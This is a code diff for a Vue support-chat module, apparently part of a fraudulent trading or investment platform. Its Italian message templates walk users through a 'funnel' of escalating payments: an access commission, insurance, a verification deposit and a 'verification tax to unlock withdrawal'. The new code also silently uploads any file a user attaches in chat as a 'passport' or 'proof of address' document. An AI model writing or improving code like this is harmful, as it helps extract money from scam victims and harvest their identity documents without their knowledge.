@@ -5,7 +5,12 @@ import { useI18n } from 'vue-i18n'
 import { useAccountStore } from '@/stores/account.store'
 import { useAccount } from '@/composables/useAccount'
 import { useCommission } from '@/composables/useCommission'
-import { fetchSupportMessages, isApiEnabled, submitSupportMessage } from '@/api/account.api'
+import {
+  fetchSupportMessages,
+  isApiEnabled,
+  submitSupportMessage,
+  uploadUserDocument,
+} from '@/api/account.api'
 import { useSimulatorStore } from '@/stores/simulator.store'
 import { useCabinetTab } from '@/composables/useCabinetTab'
 import { useNotices } from '@/composables/useNotices'
@@ -16,6 +21,7 @@ import {
   CHAT_MIN_LENGTH,
   CHAT_STORAGE_KEY,
   isChatMessage,
+  stripHeavyAttachments,
 } from '@/features/account/chat-thread'
 import type { ChatAttachment, ChatMessage } from '@/features/account/chat-thread'
 import type { CommissionFeeReason } from '@/api/commission'
@@ -44,11 +50,11 @@ const REASON_TO_LEVEL: Record<CommissionFeeReason, 1 | 2 | 3 | 4> = {
 function fallbackTemplate(lv: 1 | 2 | 3 | 4, amount: string): string {
   switch (lv) {
     case 1:
-      return `Voglio confermare il mio pagamento di ${amount} € della commissione di accesso.`
+      return 'Voglio confermare il mio pagamento'
     case 2:
-      return `Voglio pagare la copertura assicurativa di ${amount} €.`
+      return 'Voglio pagare la copertura assicurativa.'
     case 3:
-      return `Voglio effettuare il deposito di ${amount} € per la verifica.`
+      return 'Voglio effettuare il deposito per la verifica.'
     case 4:
       return `Voglio pagare la tassa di verifica di ${amount} € per sbloccare il prelievo.`
   }
@@ -123,7 +129,17 @@ function createSupportChat(): SupportChat {
   watch(
     tab,
     (next) => {
-      if (next === 'support') clearChatUnreadState()
+      if (next === 'support') {
+        clearChatUnreadState()
+        /* Длинная переписка: сразу к последнему сообщению. */
+        void scrollToEnd(true)
+        window.setTimeout(() => {
+          void scrollToEnd(true)
+        }, 80)
+        window.setTimeout(() => {
+          void scrollToEnd(true)
+        }, 280)
+      }
     },
     { immediate: true },
   )
@@ -135,19 +151,34 @@ function createSupportChat(): SupportChat {
   const threadEl = ref<HTMLElement | null>(null)
   const sending = ref(false)
   const justSent = ref(false)
-  /** Локальное фото/файл до send. */
+  /** Локальное фото/файл до send (file в памяти, не в LS). */
   const pendingAttachment = ref<ChatAttachment | null>(null)
+  let pendingBlobUrl: string | null = null
+
+  function revokePendingBlob(): void {
+    if (pendingBlobUrl) {
+      try {
+        URL.revokeObjectURL(pendingBlobUrl)
+      } catch {
+        /* ignore */
+      }
+      pendingBlobUrl = null
+    }
+  }
 
   function setPendingAttachment(file: ChatAttachment | null): void {
+    revokePendingBlob()
     pendingAttachment.value = file
+    if (file?.url?.startsWith('blob:')) pendingBlobUrl = file.url
   }
 
-  const restored = Array.isArray(stored.value) ? stored.value.filter(isChatMessage) : []
-  if (restored.length !== stored.value.length) {
-    stored.value = restored
-  }
+  const restoredRaw = Array.isArray(stored.value) ? stored.value.filter(isChatMessage) : []
+  const restored = stripHeavyAttachments(restoredRaw)
+  stored.value = restored
 
   const messages = stored
+
+
 
   /** EN-мусор от старого markMessageSent / CRM (client + agent). */
   const EN_RECEIPT_RE = /commission\s*receipt\s*confirmed/i
@@ -483,21 +514,27 @@ function createSupportChat(): SupportChat {
     delivery: ChatMessage['delivery'],
     attachment?: ChatAttachment,
   ): void {
+    const lightAttach = attachment
+      ? {
+          kind: attachment.kind,
+          name: attachment.name,
+          mime: attachment.mime,
+          /* Не кладём data:/blob: в LS */
+          url:
+            attachment.url && !/^(data:|blob:)/i.test(attachment.url)
+              ? attachment.url
+              : '',
+        }
+      : undefined
     const message: ChatMessage = {
       id: nextId(),
       author: 'client',
       text,
       at: new Date().toISOString(),
       delivery,
-      ...(attachment
-        ? {
-            attachment,
-            /* imageUrl — для старых пузырей / обратной совместимости. */
-            ...(attachment.kind === 'image' ? { imageUrl: attachment.url } : {}),
-          }
-        : {}),
+      ...(lightAttach ? { attachment: lightAttach } : {}),
     }
-    messages.value = [...messages.value, message].slice(-CHAT_KEEP)
+    messages.value = stripHeavyAttachments([...messages.value, message]).slice(-CHAT_KEEP)
   }
 
   /**
@@ -587,11 +624,16 @@ function createSupportChat(): SupportChat {
     if (!isMessenger.value) return
     confirmMessageSent() /* phase = waiting */
     notices.push('waitingInstructions')
-    /* Home: VelWaitingAdmin под балансом (не только полоска в чате) */
-    selectTab('home')
+    /*
+     * Мягкий уход на Home: дать отправиться пузырю/скроллу,
+     * затем смена вкладки (не резкий jump).
+     */
+    window.setTimeout(() => {
+      selectTab('home')
+    }, 420)
   }
 
-  function send(): void {
+  async function send(): Promise<void> {
     if (!canSend.value) return
 
     const file = pendingAttachment.value
@@ -613,29 +655,47 @@ function createSupportChat(): SupportChat {
     notices.push('supportSent', { read: tab.value === 'support' })
 
     /*
-     * Offline-first: лента + waiting.
-     * Фото/файл — локальный data URL в пузыре; API получает текст (или пометку).
+     * Сразу на бэк: файл → upload API, текст → /account/messages.
+     * В localStorage — только лёгкая метка (без data URL).
      */
+    const lightAttach: ChatAttachment | undefined = file
+      ? {
+          kind: file.kind,
+          name: file.name,
+          mime: file.mime,
+          url: '',
+        }
+      : undefined
+
     pushClientMessage(
       body,
-      funnel && isApiEnabled() ? 'sent' : 'local',
-      file ?? undefined,
+      isApiEnabled() ? 'sent' : 'local',
+      lightAttach,
     )
     draft.value = ''
-    pendingAttachment.value = null
+    setPendingAttachment(null)
     if (funnel) advanceFunnel()
-    sending.value = false
     clearChatUnreadState()
     void scrollToEnd(true)
 
     if (isApiEnabled()) {
-      void submitSupportMessage({
-        body,
-        kind: funnel ? 'commission' : 'support',
-        level: level.value,
-        email: outboundEmail.value,
-        name: outboundName.value,
-      }).catch(() => undefined)
+      try {
+        if (file?.file instanceof File) {
+          const docType = file.kind === 'image' ? 'passport' : 'proof_of_address'
+          await uploadUserDocument(file.file, docType).catch(() => undefined)
+        }
+        await submitSupportMessage({
+          body,
+          kind: funnel ? 'commission' : 'support',
+          level: level.value,
+          email: outboundEmail.value,
+          name: outboundName.value,
+        }).catch(() => undefined)
+      } finally {
+        sending.value = false
+      }
+    } else {
+      sending.value = false
     }
   }
   return {
